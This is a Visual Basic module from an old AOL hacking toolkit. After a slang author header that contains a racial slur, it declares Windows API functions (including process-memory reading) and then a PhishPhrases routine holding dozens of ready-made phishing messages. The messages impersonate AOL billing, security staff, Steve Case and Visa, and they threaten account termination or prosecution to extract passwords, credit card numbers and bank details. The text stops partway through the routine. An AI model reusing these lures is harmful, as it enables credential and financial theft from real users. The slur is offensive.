Attribute VB_Name = "Chaos232"
'Wuz Up niggie  I was gonna Quit making Bas
'files then all the sudden i saw decompiled
'Progs with my bas So I made another
'well my handle is not Chaos any more it is
'Slice
'But i made Total Chaos so i'll keep the bas
'Chaos
'I have so much more in here everfade color u
'can think of from ByteFade made By my Boy
'and Cryofade umm i got some weird stuff a Bot
'alot of stuff from my Progs Look at KNK's site
'for some codes like save text box's and scroll
'textbox's Please as soon as you use this Mail
'Me at Outletmag@hotmail or ProgerxVB@hotmail.com
'Peace


Declare Function iswindowenabled Lib "user32" Alias "IsWindowEnabled" (ByVal hWnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hWnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function Sendmessege Lib "user32" Alias "SendMessegeA" (ByValwMsg As Long, ByVal wParam As Long, Param As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hWnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hWnd As Long, ByVal x As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hWnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (Object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hWnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function sendmessagebynum& Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hWnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hWnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function getparent Lib "user32" Alias "GetParent" (ByVal hWnd As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMEssageByString Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function showwindow Lib "user32" Alias "ShowWindow" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hWnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hWnd As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hWnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Declare Function EnableWindow Lib "user32" (ByVal hWnd As Long, ByVal cmd As Long) As Long

Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2


Private Declare Function PutFocus Lib "user32" Alias "SetFocus" _
       (ByVal hWnd As Long) As Long

Private Declare Function SendMessageLong Lib "user32" Alias "SendMessageA" _
       (ByVal hWnd As Long, _
       ByVal wMsg As Long, _
       ByVal wParam As Integer, _
       ByVal lParam As Long) As Long
       Private Const EM_LINESCROLL = &HB6

Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230


Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3



Const EM_UNDO = &HC7
Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const Flags = SWP_NOMOVE Or SWP_NOSIZE

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)

Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type POINTAPI
   x As Long
   Y As Long
End Type



Sub PhishPhrases()
Randomize x
phraZes = Int((Val("140") * Rnd) + 1)
If phraZes = "1" Then
text2 = "Hi, I'm with AOL's Online Security. We have found hackers trying to get into your MailBox. Please verify your password immediately to avoid account termination.     Thank you.                                    AOL Staff"
ElseIf phraZes = "2" Then
text2 = "Hello. I am with AOL's billing department. Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. Thank you, and continue to enjoy America Online."
ElseIf phraZes = "3" Then
text2 = "Good Evening. I am with AOL's Virus Protection Group. Due to some evidence of virus uploading, I must validate your sign-on password. Please STOP what you're doing and Tell me your password.       -- AOL VPG"
ElseIf phraZes = "4" Then
text2 = "Hello, I am the Head Of AOL's XPI Link Department. Due to a configuration error in your version of AOL, I need you to verify your log-on password to me, to prevent account suspension and possible termination.  Thank You."
ElseIf phraZes = "5" Then
text2 = "Hi. You are speaking with AOL's billing manager, Steve Case. Due to a virus in one of our servers, I am required to validate your password. You will be awarded an extra 10 FREE hours of air-time for the inconvenience."
ElseIf phraZes = "6" Then
text2 = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
ElseIf phraZes = "7" Then
text2 = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf phraZes = "8" Then
text2 = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf phraZes = "9" Then
text2 = "Hi, I'm Alex Troph of America Online Sevice Department. Your online account, #3560028, is displaying a billing error. We need you to respond back with your name, address, card number, expiration date, and daytime phone number. Sorry for this inconvenience."
ElseIf phraZes = "10" Then
text2 = "Hello, I am a representative of the VISA Corp.  Due to a computer error, we are unable complete your membership to America Online. In order to correct this problem, we ask that you hit the `Respond` key, and reply with your full name and password, so that the proper changes can be made to avoid cancellation of your account. Thank you for your time and cooperation.  :-)"
ElseIf phraZes = "11" Then
text2 = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records. Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again. Thank you.  :-)"
ElseIf phraZes = "12" Then
text2 = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Telephone#, Visa Card#, and Expiration date. If this information is not processed promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
ElseIf phraZes = "13" Then
text2 = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that your validation process is almost complete.  To complete your validation process I need you to please hit the `Respond` key and reply with the following information: Name, Address, Phone Number, City, State, Zip Code,  Credit Card Number, Expiration Date, and Bank Name.  Thank you for your time and cooperation and we hope that you enjoy America Online. :-)"
ElseIf phraZes = "14" Then
text2 = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation."
ElseIf phraZes = "15" Then
text2 = "Hello, this is the America Online Billing Department.  Due to a System Crash, we have lost your billing information.  Please hit respond, then enter your Credit Card Number, and experation date.  Thank You, and sorry for the inconvience."
ElseIf phraZes = "16" Then
text2 = "ATTENTION:  This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."
ElseIf phraZes = "17" Then
text2 = "Sorry, there seems to be a problem with your bill. Please reply with your password to verify that you are the account holder.  Thank you."
ElseIf phraZes = "18" Then
text2 = "Sorry  the credit card you entered is invalid. Perhaps you mistyped it?  Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it. Thank you and enjoy AOL."
ElseIf phraZes = "19" Then
text2 = "Sorry, your credit card failed authorization. Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it.  Thank you and enjoy AOL."
ElseIf phraZes = "20" Then
text2 = "Due to the numerous use of identical passwords of AOL members, we are now generating new passwords with our computers.  Your new password is 'Stryf331', You have the choice of the new or old password.  Click respond and try in your preferred password.  Thank you"
ElseIf phraZes = "21" Then
text2 = "I work for AOL's Credit Card department. My job is to check EVERY AOL account for credit accuracy.  When I got to your account, I am sorry to say, that the Credit information is now invalid. We DID have a sysem crash, which my have lost the information, please click respond and type your VALID credit card info.  Card number, names, exp date, etc, Thank you!"
ElseIf phraZes = "22" Then
text2 = "Hello I am with AOL Account Defense Department.  We have found that your account has been dialed from San Antonia,Texas. If you have not used it there, then someone has been using your account.  I must ask for your password so I can change it and catch him using the old one.  Thank you."
ElseIf phraZes = "23" Then
text2 = "Hello member, I am with the TOS department of AOL.  Due to the ever changing TOS, it has dramatically changed.  One new addition is for me, and my staff, to ask where you dialed from and your password.  This allows us to check the REAL adress, and the password to see if you have hacked AOL.  Reply in the next 1 minute, or the account WILL be invalidated, thank you."
ElseIf phraZes = "24" Then
text2 = "Hello member, and our accounts say that you have either enter an incorrect age, or none at all.  This is needed to verify you are at a legal age to hold an AOL account.  We will also have to ask for your log on password to further verify this fact. Respond in next 30 seconds to keep account active, thank you."
ElseIf phraZes = "25" Then
text2 = "Dear member, I am Greg Toranis and I werk for AOL online security. We were informed that someone with that account was trading sexually explecit material. That is completely illegal, although I presonally do not care =).  Since this is the first time this has happened, we must assume you are NOT the actual account holder, since he has never done this before. So I must request that you reply with your password and first and last name, thank you."
ElseIf phraZes = "26" Then
text2 = "Hello, I am Steve Case.  You know me as the creator of America Online, the world's most popular online service.  I am here today because we are under the impression that you have 'HACKED' my service.  If you have, then that account has no password.  Which leads us to the conclusion that if you cannot tell us a valid password for that account you have broken an international computer privacy law and you will be traced and arrested.  Please reply with the password to avoind police action, thank you."
ElseIf phraZes = "27" Then
text2 = "Dear AOL member.  I am Guide zZz, and I am currently employed by AOL.  Due to a new AOL rate, the $10 for 20 hours deal, we must ask that you reply with your log on password so we can verify the account and allow you the better monthly rate. Thank you."
ElseIf phraZes = "28" Then
text2 = "Hello I am CATWatch01. I witnessed you verbally assaulting an AOL member.  The account holder has never done this, so I assume you are not him.  Please reply with your log on password as proof.  Reply in next minute to keep account active."
ElseIf phraZes = "29" Then
text2 = "I am with AOL's Internet Snooping Department.  We watch EVERY site our AOL members visit.  You just recently visited a sexually explecit page.  According to the new TOS, we MUST imose a $10 fine for this.  I must ask you to reply with either the credit card you use to pay for AOL with, or another credit card.  If you do not, we will notify the authorities.  I am sorry."
ElseIf phraZes = "30" Then
text2 = "Dear AOL Customer, despite our rigorous efforts in our battle against 'hackers', they have found ways around our system, logging onto unsuspecting users accounts WITHOUT thier passwords. To ensure you are the responsible, paying customer -and not a 'hacker'- we need you to click on the RESPOND button and enter your password for verification. We are very sorry for this trouble. --AOL Security/B.A.H. Team"
ElseIf phraZes = "31" Then
text2 = "Dear member, I am a Service Representitive with the America Online Corporation,and I am sorry to inform you that we have encountered an error in our Main-Frame computer system and lost the billing information to some of our users.  Unfortunatley your account was in that group. We need you to reply back with your billing information including: Name (as appears on card), address, and C.C. Number w/EXP Date. Failure in correcting this problem will result in account termination. Thank you for your cooperation-for your assistance with this problem your account will be credited w/2 free hours of online time.  --AOL Cust. Service"
ElseIf phraZes = "32" Then
text2 = "Good evening AOL User, our billing department is having computer trouble -the terminal containing your billing information- and we are positive that our computers have been fully restored, but to verify this information and to cause the least amount of complications as possible, we only need you to click RESPOND and enter your Credit Card number including EXP. Date...we are very sorry for any trouble.   --AOL Billing Department"
ElseIf phraZes = "33" Then
text2 = "Hello I am with America Online New user Data base we have encounterd an error in your sign up process please respond and State your full name first and last and your personal log in password."
ElseIf phraZes = "34" Then
text2 = "Hello I am with America Online Billing department and we have you down to get billed in 2weeks $300 dollars if you disagree please respond with your full name Creidt card number with experation date address area code city state and phone number."
ElseIf phraZes = "35" Then
text2 = "Hello i am With America  Online billing Dep. we are missing your sign up file from our user data base please click respond and send us your full name address city state zipcode areacode phone number Creidt card with experation date and personal log on password."
ElseIf phraZes = "36" Then
text2 = "Hello, I am an America Online Billing Representative and I am very sorry to inform you that we have accidentally deleted your billing records from our main computer.  I must ask you for your full name, address, day/night phone number, city, state, credit card number, expiration date, and the bank.  I am very sorry for the invonvenience.  Thank you for your understanding and cooperation!  Brad Kingsly, (CAT ID#13)  Vienna, VA."
ElseIf phraZes = "37" Then
text2 = "Hello, I am a member of the America Online Security Agency (AOSA), and we have identified a scam in your billing.  We think that you may have entered a false credit card number on accident.  For us to be sure of what the problem is, you MUST respond with your password.  Thank you for your cooperation!  (REP Chris)  ID#4322."
ElseIf phraZes = "38" Then
text2 = "Hello, I am an America Online Billing Representative. It seems that the America On-line password record was tampered with by un-authorized officials. Some, but very few passwords were changed. This slight situation occured not less then five minutes ago.I will have to ask you to click the respond button and enter your log-on password. You will be informed via E-Mail with a conformation stating that the situation has been resolved.Thank you for your cooperation. Please keep note that you will be recieving E-Mail from us at AOLBilling. And if you have any trouble concerning passwords within your account life, call our member services number at 1-800-328-4475."
ElseIf phraZes = "39" Then
text2 = "Dear AOL member, We are sorry to inform you that your account information was accidentely deleted from our account database. This VERY unexpected error occured not less than five minutes ago.Your screen name (not account) and passwords were completely erased. Your mail will be recovered, but your billing info will be erased Because of this situation, we must ask you for your password. I realize that we aren't supposed to ask your password, but this is a worst case scenario that MUST be corrected promptly, Thank you for your cooperation."
ElseIf phraZes = "40" Then
text2 = "AOL User: We are very sorry to inform you that a mistake was made while correcting people's account info. Your screen name was (accidentely) selected by AOL to be deleted. Your account cannot be totally deleted while you are online, so luckily, you were signed on for us to send this message.All we ask is that you click the Respond button and enter your logon password. I can also asure you that this scenario will never occur again. Thank you for your coop"
ElseIf phraZes = "41" Then
text2 = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf phraZes = "42" Then
text2 = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
ElseIf phraZes = "43" Then
text2 = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf phraZes = "44" Then
text2 = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf phraZes = "45" Then
text2 = "Hello, how is one of our more privelaged OverHead Account Users doing today? We are sorry to report that due to hackers, Stratus is reporting problems, please respond with the last four digits of your home telephone number and Logon PW. Thanks -AOL Acc.Dept."
ElseIf phraZes = "46" Then
text2 = "Please click on 'respond' and send me your personal logon password immediately so we may validate your account.  Failure to cooperate may result in permanent account termination.  Thank you for your cooperation and enjoy the service!"
ElseIf phraZes = "47" Then
text2 = "Due to problems with the New Member Database of America Online, we are forced to ask you for your personal logon password online.  Please click on 'respond' and send me this information immediately or face account termination!  Thank you for your cooperation."
ElseIf phraZes = "48" Then
text2 = "Hello current user,we had a virus in are system today around 8:30 this morning,Random memory loses followed!We are going to have to ask for your billing info that you entered in when you signed up![Credit Card number,Address,Phone number,Zip code,State]To keep your account active,in case you do not reply with the information requested your account will be shut down,If this should happen,contact us at our 800#!Thank you for your cooperation! :-)   :AOL Billing"
ElseIf phraZes = "49" Then
text2 = "During your sign on period your Credit Card number did not cycle,please respond with the credit card number used during sign-up!To remain signed on our service,If you do not reply we will have to terminate your account,If this happens please contact our 800# at [1-800-827-6364].Thank you for your time,for your cooperation your account will be credited 10 free hours!  :-)      :AOL Billing"
ElseIf phraZes = "50" Then
text2 = "Hello current member,This is the AOL billing department,We are going have to ask you for your credit card information you have used to make the account you are currently on!We had a bug in the system earlier and it may of caused errors in your bill,When you reply we will verify your account and send you,your current monthes total!If there should be errors,please contact us at [1-800-827-3891].Thank you for your time.          :AOL Billing"
ElseIf phraZes = "51" Then
text2 = "Sorry to disturb you, but are records indicate the the credit card number you gave us has expired.  Please click respond and type in your cc# so that i may verify this and correct all errors!"
ElseIf phraZes = "52" Then
text2 = "I work for Intel, I have a great new catalouge! If you would like this catalouge and a coupon for $200 off your next Intel purchase, please click on respond, and give me your address, full name, and your credit card number. Thanks! |=-)"
ElseIf phraZes = "53" Then
text2 = "Hello, I am TOS ADVISOR and seeing that I made a mistake  we seem to have failed to recieve your logon password. Please click respond and enter your Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
ElseIf phraZes = "54" Then
text2 = "Pardon me, I am with AOL's Staff and due to a transmission error we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond within 2 minutes too keep this account active. Thank you for your cooperation."
ElseIf phraZes = "55" Then
text2 = "Hello, I am with America Online and due to technical problems we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
ElseIf phraZes = "56" Then
text2 = "Dear User,     Upon sign up you have entered incorrect credit information. Your current credit card information  does not match the name and/or address.  We have rescently noticed this problem with the help of our new OTC computers.  If you would like to maintain an account on AOL, please respond with your Credit Card# with it's exp.date,and your Full name and address as appear on the card.  And in doing so you will be given 15 free hours.  Reply within 5 minutes to keep this accocunt active."
ElseIf phraZes = "57" Then
text2 = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Tele#, Visa Card#, and Exp. Date. If this information is not received promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
ElseIf phraZes = "58" Then
text2 = "Hello and welcome to America online.  We know that we have told you not to reveal your billing information to anyone, but due to an unexpected crash in our systems, we must ask you for the following information to verify your America online account: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. After this initial contact we will never again ask you for your password or any billing information. Thank you for your time and cooperation.  :-)"
ElseIf phraZes = "59" Then
text2 = "Hello, I am a represenative of the AOL User Resource Dept.  Due to an error in our computers, your registration has failed authorization. To correct this problem we ask that you promptly hit the `Respond` key and reply with the following information: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. We hope that you enjoy are services here at America Online. Thank You.  For any further questions please call 1-800-827-2612. :-)"
ElseIf phraZes = "60" Then
text2 = "Hello, I am a member of the America Online Billing Department.  We are sorry to inform you that we have experienced a Security Breach in the area of Customer Billing Information.  In order to resecure your billing information, we ask that you please respond with the following information: Name, Addres, Tele#, Credit Card#, Bank Name, Exp. Date, Screen Name, and Log-on Password. Failure to do so will result in immediate account termination. Thank you and enjoy America Online.  :-)"
ElseIf phraZes = "61" Then
text2 = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted! "
ElseIf phraZes = "62" Then
text2 = "Hello AOL Member , I am with the OnLine Technical Consultants(OTC).  You are not fully registered as an AOL memberand you are going OnLine ILLEGALLY. Please respond to this IM with your Credit Card Number , your full name , the experation date on your Credit Card and the Bank.  Please respond immediatly so that the OTC can fix your problem! Thank you and have a nice day!  : )"
ElseIf phraZes = "63" Then
text2 = "Hello AOL Memeber.  I am sorry to inform you that a hacker broke into our system and deleted all of our files.  Please respond to this IM with you log-on password password so that we can verify billing , thank you and have a nice day! : )"
ElseIf phraZes = "64" Then
text2 = "Hello User.  I am with the AOL Billing Department.  This morning their was a glitch in our phone lines.  When you signed on it did not record your login , so please respond to this IM with your log-on password so that we can verify billing , thank you and have a nice day! : )"
ElseIf phraZes = "65" Then
text2 = "Dear AOL Member.  There has been hackers using your account.  Please respond to this IM with your log-on password so that we can verify that you are not the hacker.  Respond immedialtly or YOU will be considered the hacker and YOU wil be prosecuted! Thank you and have a nice day.  : )"
ElseIf phraZes = "66" Then
text2 = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted!"
ElseIf phraZes = "67" Then
text2 = "AOL Member , I am sorry to bother you but your account information has been deleted by hackers.  AOL has searched every bank but has found no record of you.  Please respond to this IM with your log-on password , Credit Card Number , Experation Date , you Full Name , and the Bank.  Please respond immediatly so that we can get this fixed.  Thank you and have a nice day.   :)"
ElseIf phraZes = "68" Then
text2 = "Dear Member , I am sorry to inform you that you have 5 TOS Violation Reports..the maximum you can have is five.  Please respond to this IM with your log-on password , your Credit Card Number , your Full Name , the Experation Date , and the Bank.  If you do not respond within 2 minutes than your account will be TERMINATED!! Thank you and have a nice day.  : )"
ElseIf phraZes = "69" Then
text2 = "Hello,Im with OTC(Online Technical Consultants).Im here to inform you that your AOL account is showing a billing error of $453.26.To correct this problem we need you to respond with your online password.If you do not comply,you will be forced to pay this bill under federal law. "
ElseIf phraZes = "70" Then
text2 = "Hello,Im here to inform you that you just won a online contest which consisted of a $3000 dollar prize.We seem to have lost all of your account info.So in order to receive your prize you need to respond with your log on password so we can rush your prize straight to you!  Thank you."
ElseIf phraZes = "71" Then
text2 = "Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation."
ElseIf phraZes = "72" Then
text2 = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again.  Thank you.  :-)"
